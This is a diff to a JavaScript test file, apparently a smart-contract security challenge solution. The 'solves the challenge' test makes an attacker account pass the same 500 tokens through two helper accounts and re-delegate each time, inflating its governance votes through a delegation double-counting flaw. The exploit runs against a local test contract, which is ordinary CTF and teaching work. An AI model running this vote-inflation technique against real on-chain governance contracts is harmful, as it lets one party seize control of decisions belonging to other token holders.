@@ -42,6 +42,36 @@ before(async () => {
 it("solves the challenge", async function () {
 
   // implement solution here
+  // console.log(await governanceToken.getCurrentVotes(await attacker.getAddress()));
+  // await governanceToken.connect(attacker).delegate(o1.getAddress())
+  // console.log(await governanceToken.getCurrentVotes(await o1.getAddress()))
+  // await governanceToken.connect(attacker).transfer(o1.getAddress(), precision.mul(500))
+  // await governanceToken.connect(o1).delegate(attacker.getAddress());
+  // console.log(await governanceToken.getCurrentVotes(await o1.getAddress()));
+  // await governanceToken.connect(attacker).delegate(o2.getAddress());
+  // console.log(await governanceToken.getCurrentVotes(await o2.getAddress()));
+
+  await governanceToken.connect(attacker).delegate(attacker.getAddress());
+
+  await governanceToken
+    .connect(attacker)
+    .transfer(o1.getAddress(), precision.mul(500));
+  await governanceToken.connect(o1).delegate(attacker.getAddress());
+
+  await governanceToken
+    .connect(o1)
+    .transfer(o2.getAddress(), precision.mul(500));
+  await governanceToken.connect(o2).delegate(attacker.getAddress());
+
+  await governanceToken
+    .connect(o2)
+    .transfer(attacker.getAddress(), precision.mul(500));
+  await governanceToken.connect(o2).delegate(adminUser.getAddress());
+
+  await governanceToken
+    .connect(attacker)
+    .transfer(o2.getAddress(), precision.mul(500));
+   await governanceToken.connect(o2).delegate(attacker.getAddress());
 
 });
 
